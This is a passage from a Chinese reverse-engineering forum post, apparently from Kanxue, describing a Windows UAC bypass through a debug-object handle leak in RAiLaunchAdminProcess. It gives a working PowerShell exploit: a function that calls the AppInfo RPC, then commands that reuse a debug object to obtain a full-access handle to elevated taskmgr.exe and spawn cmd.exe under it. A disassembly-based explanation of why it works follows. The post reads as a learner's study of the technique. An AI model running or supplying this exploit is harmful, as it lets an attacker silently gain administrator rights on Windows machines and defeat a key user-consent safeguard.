
```powershell
function Start-Uac {
    Param(
        [Parameter(Mandatory, Position = 0)]
        [string]$Executable,
        [switch]$RunAsAdmin
    )

    $CreateFlags = [NtApiDotNet.Win32.CreateProcessFlags]::DebugProcess -bor `
        [NtApiDotNet.Win32.CreateProcessFlags]::UnicodeEnvironment
    $StartInfo = $client.New.APP_STARTUP_INFO()

    $result = $client.RAiLaunchAdminProcess($Executable, $Executable,`
        [int]$RunAsAdmin.IsPresent, [int]$CreateFlags,`
        "C:\", "WinSta0\Default", $StartInfo,
        0, -1)
    if ($result.retval -ne 0) {
        $ex = [System.ComponentModel.Win32Exception]::new($result.retval)
        throw $ex
    }

    $h = $result.ProcessInformation.ProcessHandle.Value
    Get-NtObjectFromHandle $h -OwnsHandle
}
```

1. 调用 `Start-Uac` 函数创建非提升的进程（`notepad.exe`），获得调试对象的句柄，终止进程并分离调试器

```powershell
$p = Start-Uac "c:\windows\system32\notepad.exe"
$dbg = Get-NtDebug -Process $p
Stop-NtProcess $p
Remove-NtDebugProcess $dbg -Process $p
```

2. 再次调用 `Start-Uac` 函数创建提升的进程（`taskmgr.exe`），对调试对象句柄发出等待以获取初始调试事件句柄，然后使用 `Copy-NtObject` 从提升的进程复制当前进程伪句柄（`-1`）来获得完全的特权进程句柄

```powershell
$p = Start-Uac "c:\windows\system32\taskmgr.exe" -RunAsAdmin
$ev = Start-NtDebugWait -Seconds 0 -DebugObject $dbg
$h = [IntPtr]-1
$new_p = Copy-NtObject -SourceProcess $ev.Process -SourceHandle $h
Remove-NtDebugProcess $dbg -Process $new_p
```

3. 拥有了完全的特权进程句柄后就可以创建特权的子进程了

```powershell
New-Win32Process "cmd.exe" -ParentProcess $new_p -CreationFlags NewConsole
```

如下：

![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_FX3FZPRBTJ5CEPP.png)

在这个过程中遇到过模块无法加载的问题，解决：（以管理员身份打开 PowerShell 输入 `set-executionpolicy remotesigned`，就当是先测试下吧，实际情况下还是会用 C 或 C# 程序）。参考：[6f3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0c8W2j5h3q4V1x3U0p5$3x3K6f1$3y4H3`.`.](https://bbs.kanxue.com/elink@6f3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0c8W2j5h3q4V1x3U0p5$3x3K6f1$3y4H3`.`.)

![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_9FY8QPZ738XF96E.png)

## 简单分析

首先回顾一下 `RAiLaunchAdminProcess` 函数，该函数原型如下：

```c
long RAiLaunchAdminProcess(
    handle_t hBinding,
    [in][unique][string] wchar_t* ExecutablePath,
    [in][unique][string] wchar_t* CommandLine,
    [in] long StartFlags,
    [in] long CreateFlags,
    [in][string] wchar_t* CurrentDirectory,
    [in][string] wchar_t* WindowStation,
    [in] struct APP_STARTUP_INFO* StartupInfo,
    [in] unsigned __int3264 hWnd,
    [in] long Timeout,
    [out] struct APP_PROCESS_INFORMATION* ProcessInformation,
    [out] long * ElevationType
);
```

经过分析可以知道，该函数通过 `AiCheckLUA -> AiLaunchConsentUI -> AiLaunchProcess -> CreateProcessAsUserW` 函数调用链来启动 `consent.exe` 进程来判断是否需要弹窗，然后通过 `AiLaunchProcess -> CreateProcessAsUserW` 函数调用链启动目标程序。以下为 `AiLaunchProcess` 函数调用 `CreateProcessAsUserW` 函数的过程，其中 `a7` 来自 `AiLaunchProcess` 函数的第 7 个参数：

![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_57XNN85G6CCHUS5.png)

经过回溯发现该参数来自于 `RAiLaunchAdminProcess` 函数的第 6 个参数 `a6`，由于 `RAiLaunchAdminProcess` 函数采用异步处理，其第一个参数对应了 `PRPC_ASYNC_STATE` 类型的 `pAsync`，因而 `a6` 对应的参数是 `CreateFlags`。

![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_SF4KG43XSX9JRT6.png)

在调用 `CreateProcessAsUserW` 函数的时候会传入 `CreateFlags | 0x80004`，`CreateFlags` 对应的 flag 列表可参考：[5daK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8Y4m8J5L8$3y4@1K9s2u0W2j5h3c8Q4x3V1k6H3M7X3!0U0k6i4y4K6i4K6u0V1j5%4u0W2j5i4c8A6L8$3&6Q4x3X3c8X3L8r3q4Y4M7H3`.`.](https://bbs.kanxue.com/elink@6c8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8Y4m8J5L8$3y4@1K9s2u0W2j5h3c8Q4x3V1k6H3M7X3!0U0k6i4y4K6i4K6u0V1j5%4u0W2j5i4c8A6L8$3&6Q4x3X3c8X3L8r3q4Y4M7H3`.`.)，其中，设置 `DEBUG_PROCESS` 标志允许启动并调试新进程。

- `DEBUG_PROCESS`（`0x00000001`）：调用线程启动并调试新进程和新进程创建的所有子进程，可以使用 `WaitForDebugEvent` 函数接收所有相关的调试事件
- `CREATE_SUSPENDED`（`0x00000004`）：新进程的主线程以挂起状态创建，直到调用 `ResumeThread` 函数才运行
- `CREATE_UNICODE_ENVIRONMENT`（`0x00000400`）：`lpEnvironment` 指向的环境块使用 `Unicode` 字符
- `EXTENDED_STARTUPINFO_PRESENT`（`0x00080000`）：该进程需要使用扩展启动信息创建，通过 `lpStartupInfo` 参数指定 `STARTUPINFOEX` 结构

访问进程的调试对象句柄需要对进程句柄具有 `PROCESS_QUERY_INFORMATION` 访问权限，但如果是提升的进程，我们只能获得对该进程句柄的 `PROCESS_QUERY_LIMITED_INFORMATION` 访问权限。这种限制使我们不能简单地获取提升进程的调试对象句柄。

不过由于设置了 `DEBUG_PROCESS` 标志，在调用 `CreateProcessAsUserW` 函数过程中会调用 `ntdll!DbgUiConnectToDbg` 函数，该函数从 `TEB` 中获取调试对象，如下所示：

![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_PVMH95QSNAUT8X5.png)

`DbgUiConnectToDbg` 函数首先会判断 `TEB` 偏移 `0x16A8` 处是不是 0（`+0x16a0 DbgSsReserved : [2] (null)`），如果是的话，就调用 `NtCreateDebugObject` 函数来创建一个调试对象，相当于初始化当前线程的调试对象。如果这个线程再调试一个进程，就可以直接从 `TEB` 偏移 `0x16A8` 处获得

![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_246HYPNUQSVH3HT.png)

如果我们先创建一个普通进程并启用调试，在获得其调试句柄后分离调试器并终止进程，然后再创建一个调试的提升的进程，这样我们就有了获得提升进程的调试对象句柄的这个前提。然后就可以调用 `WaitForDebugEvent` 函数等待目标调试事件从而获得提升的进程句柄（`NtWaitForDebugEvent` 函数调用 `DbgkpOpenHandles` 处理 `CREATE_PROCESS_DEBUG_EVENT` 类型事件时，会初始化 `CREATE_PROCESS_DEBUG_INFO` 结构中的进程句柄），虽然获得了这个句柄，但我们缺少 `PROCESS_SUSPEND_RESUME` 权限，这会阻止我们将进程与调试对象分离。但由于我们具有 `PROCESS_DUP_HANDLE` 权限，因而可以调用 `NtDuplicateObject` 函数复制句柄从而获得完全提升的权限：

![图片描述](https://bbs.kanxue.com/upload/attach/202206/701197_HQ63GEWE5G7WJQN.png)

## 小结

验证某个结论往往是简单的，能自己寻找到那个点是困难且有意义的，此时发出一声哀叹，哎~ 太难了。新手上路，希望大佬们多带带菜鸡 T_T

## 参考链接

[1adK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8W2N6b7N6$3q4D9N6r3g2J5i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5^5z5e0R3K6z5o6R3^5x3b7`.`.](https://bbs.kanxue.com/elink@009K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8W2N6b7N6$3q4D9N6r3g2J5i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5^5z5e0R3K6z5o6R3^5x3b7`.`.)

[a0dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2N6$3q4D9N6r3g2J5L8s2k6Q4x3X3g2U0L8$3#2Q4x3V1k6H3L8%4y4@1i4K6u0r3N6$3W2F1k6r3!0%4M7#2)9J5k6s2g2K6k6i4u0Q4x3X3c8S2j5$3y4G2N6h3&6@1i4K6u0V1j5$3!0F1N6s2u0G2L8q4)9J5k6h3S2@1L8h3H3`.](https://bbs.kanxue.com/elink@7b5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2N6$3q4D9N6r3g2J5L8s2k6Q4x3X3g2U0L8$3#2Q4x3V1k6H3L8%4y4@1i4K6u0r3N6$3W2F1k6r3!0%4M7#2)9J5k6s2g2K6k6i4u0Q4x3X3c8S2j5$3y4G2N6h3&6@1i4K6u0V1j5$3!0F1N6s2u0G2L8q4)9J5k6h3S2@1L8h3H3`.)

[0cdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2N6$3q4D9N6r3g2J5L8s2k6Q4x3X3g2U0L8$3#2Q4x3V1k6H3L8%4y4@1i4K6u0r3M7X3g2I4N6h3g2K6N6r3g2V1i4K6u0V1k6i4S2W2j5%4g2@1K9h3!0F1i4K6u0V1L8r3g2$3k6h3I4Q4x3X3c8G2k6W2)9J5k6r3q4H3M7r3I4A6j5$3q4@1K9h3!0F1i4K6u0V1L8h3q4F1K9h3k6W2M7%4b7`.](https://bbs.kanxue.com/elink@1b1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2N6$3q4D9N6r3g2J5L8s2k6Q4x3X3g2U0L8$3#2Q4x3V1k6H3L8%4y4@1i4K6u0r3M7X3g2I4N6h3g2K6N6r3g2V1i4K6u0V1k6i4S2W2j5%4g2@1K9h3!0F1i4K6u0V1L8r3g2$3k6h3I4Q4x3X3c8G2k6W2)9J5k6r3q4H3M7r3I4A6j5$3q4@1K9h3!0F1i4K6u0V1L8h3q4F1K9h3k6W2M7%4b7`.)

[ad4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2@1K9r3g2E0j5i4W2G2M7W2)9J5k6i4c8W2j5$3S2Q4x3V1k6#2N6r3W2D9K9i4A6A6L8X3N6Q4x3X3c8S2i4K6u0V1j5$3!0E0L8h3!0F1i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6r3u0A6L8X3q4J5P5g2)9J5k6s2c8G2i4K6u0V1k6i4y4U0j5h3I4S2N6r3g2Q4x3X3c8@1L8#2)9J5k6s2y4&6M7%4c8W2L8g2)9J5k6s2m8J5K9i4k6A6L8r3g2Y4k6i4y4Q4x3X3c8U0x3e0j5@1z5o6u0U0j5$3g2V1y4r3t1`.](https://bbs.kanxue.com/elink@876K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2@1K9r3g2E0j5i4W2G2M7W2)9J5k6i4c8W2j5$3S2Q4x3V1k6#2N6r3W2D9K9i4A6A6L8X3N6Q4x3X3c8S2i4K6u0V1j5$3!0E0L8h3!0F1i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6r3u0A6L8X3q4J5P5g2)9J5k6s2c8G2i4K6u0V1k6i4y4U0j5h3I4S2N6r3g2Q4x3X3c8@1L8#2)9J5k6s2y4&6M7%4c8W2L8g2)9J5k6s2m8J5K9i4k6A6L8r3g2Y4k6i4y4Q4x3X3c8U0x3e0j5@1z5o6u0U0j5$3g2V1y4r3t1`.)

[817K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6k6r3W2G2N6r3x3@1N6q4)9J5k6h3y4G2L8g2)9J5c8Y4m8J5K9i4k6A6L8r3g2Y4k6g2)9J5k6r3g2K6j5$3q4D9j5i4c8A6L8$3&6Q4x3V1k6T1P5i4m8S2M7%4y4#2j5h3y4Q4x3X3c8X3L8$3c8Z5k6h3I4H3k6i4t1`.](https://bbs.kanxue.com/elink@ef4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6k6r3W2G2N6r3x3@1N6q4)9J5k6h3y4G2L8g2)9J5c8Y4m8J5K9i4k6A6L8r3g2Y4k6g2)9J5k6r3g2K6j5$3q4D9j5i4c8A6L8$3&6Q4x3V1k6T1P5i4m8S2M7%4y4#2j5h3y4Q4x3X3c8X3L8$3c8Z5k6h3I4H3k6i4t1`.)

[35eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6@1k6h3&6S2j5X3I4W2i4K6u0V1N6r3g2U0K9r3u0D9L8$3N6Q4x3V1k6#2j5h3y4Q4x3X3c8T1P5i4m8S2M7%4y4Q4x3X3c8T1P5g2)9J5k6r3#2G2j5$3E0A6L8X3N6Q4x3X3c8@1M7Y4g2K6N6r3g2V1i4K6u0V1k6r3W2J5k6h3y4@1L8%4u0A6k6i4y4Q4x3X3b7J5y4r3p5&6y4U0j5%4y4h3j5$3k6b7`.`.](https://bbs.kanxue.com/elink@234K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6@1k6h3&6S2j5X3I4W2i4K6u0V1N6r3g2U0K9r3u0D9L8$3N6Q4x3V1k6#2j5h3y4Q4x3X3c8T1P5i4m8S2M7%4y4Q4x3X3c8T1P5g2)9J5k6r3#2G2j5$3E0A6L8X3N6Q4x3X3c8@1M7Y4g2K6N6r3g2V1i4K6u0V1k6r3W2J5k6h3y4@1L8%4u0A6k6i4y4Q4x3X3b7J5y4r3p5&6y4U0j5%4y4h3j5$3k6b7`.`.)

[badK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4z5g2)9J5c8U0p5J5i4K6u0r3j5$3q4D9L8r3W2F1k6#2)9J5k6r3I4G2j5$3q4D9i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6s2u0H3j5#2)9J5k6s2y4W2M7Y4k6W2M7Y4y4Q4x3X3c8X3M7X3!0E0i4K6u0W2K9s2c8E0L8l9`.`.](https://bbs.kanxue.com/elink@012K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4z5g2)9J5c8U0p5J5i4K6u0r3j5$3q4D9L8r3W2F1k6#2)9J5k6r3I4G2j5$3q4D9i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6s2u0H3j5#2)9J5k6s2y4W2M7Y4k6W2M7Y4y4Q4x3X3c8X3M7X3!0E0i4K6u0W2K9s2c8E0L8l9`.`.)

[cc5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4z5g2)9J5c8U0l9@1i4K6u0r3N6$3W2F1k6r3!0%4M7#2)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5k6s2c8J5K9h3y4C8M7#2)9J5k6r3q4T1N6i4y4A6L8X3N6Q4x3X3g2Z5N6r3#2D9](https://bbs.kanxue.com/elink@10bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4L8$3!0Y4L8r3g2H3M7X3!0B7k6h3y4@1P5X3g2J5L8#2)9J5k6h3u0D9L8$3N6K6M7r3!0@1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4z5g2)9J5c8U0l9@1i4K6u0r3N6$3W2F1k6r3!0%4M7#2)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5k6s2c8J5K9h3y4C8M7#2)9J5k6r3q4T1N6i4y4A6L8X3N6Q4x3X3g2Z5N6r3#2D9)

[fe0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2F1M7$3k6G2j5%4g2K6i4K6u0W2L8X3g2@1i4K6u0r3j5i4m8H3K9h3&6X3L8#2)9J5k6s2u0H3j5#2)9J5k6s2g2S2j5#2)9J5k6r3u0&6M7r3q4K6M7#2)9J5c8R3`.`.](https://bbs.kanxue.com/elink@6cdK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2F1M7$3k6G2j5%4g2K6i4K6u0W2L8X3g2@1i4K6u0r3j5i4m8H3K9h3&6X3L8#2)9J5k6s2u0H3j5#2)9J5k6s2g2S2j5#2)9J5k6r3u0&6M7r3q4K6M7#2)9J5c8R3`.`.)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2022-6-2 20:55 被清音弦上月编辑，原因：

[#调试逆向](https://bbs.kanxue.com/forum-4-1-1.htm)
